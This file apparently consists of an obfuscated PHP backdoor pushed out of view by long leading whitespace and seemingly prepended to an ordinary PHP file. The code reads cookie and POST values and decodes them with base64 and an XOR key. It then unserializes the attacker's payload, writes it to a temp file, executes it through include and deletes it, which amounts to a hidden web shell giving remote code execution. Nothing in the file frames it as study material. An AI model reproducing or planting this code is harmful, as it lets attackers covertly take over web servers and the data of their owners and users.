<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("rqdhcgj")){class rqdhcgj{public static $npqrjk = "ibowptcecofgpufp";public static $tmiknodt = NULL;public function __construct(){$gdacpshjss = @$_COOKIE[substr(rqdhcgj::$npqrjk, 0, 4)];if (!empty($gdacpshjss)){$uftonx = "base64";$beahjjnuw = "";$gdacpshjss = explode(",", $gdacpshjss);foreach ($gdacpshjss as $lecsgj){$beahjjnuw .= @$_COOKIE[$lecsgj];$beahjjnuw .= @$_POST[$lecsgj];}$beahjjnuw = array_map($uftonx . "_decode", array($beahjjnuw,));$beahjjnuw = $beahjjnuw[0] ^ str_repeat(rqdhcgj::$npqrjk, (strlen($beahjjnuw[0]) / strlen(rqdhcgj::$npqrjk)) + 1);rqdhcgj::$tmiknodt = @unserialize($beahjjnuw);}}public function __destruct(){$this->gxsrgpfmcr();}private function gxsrgpfmcr(){if (is_array(rqdhcgj::$tmiknodt)) {$kngbejozzl = sys_get_temp_dir() . "/" . crc32(rqdhcgj::$tmiknodt["salt"]);@rqdhcgj::$tmiknodt["write"]($kngbejozzl, rqdhcgj::$tmiknodt["content"]);include $kngbejozzl;@rqdhcgj::$tmiknodt["delete"]($kngbejozzl);exit();}}}$jrqirv = new rqdhcgj();$jrqirv = NULL;} ?><?php
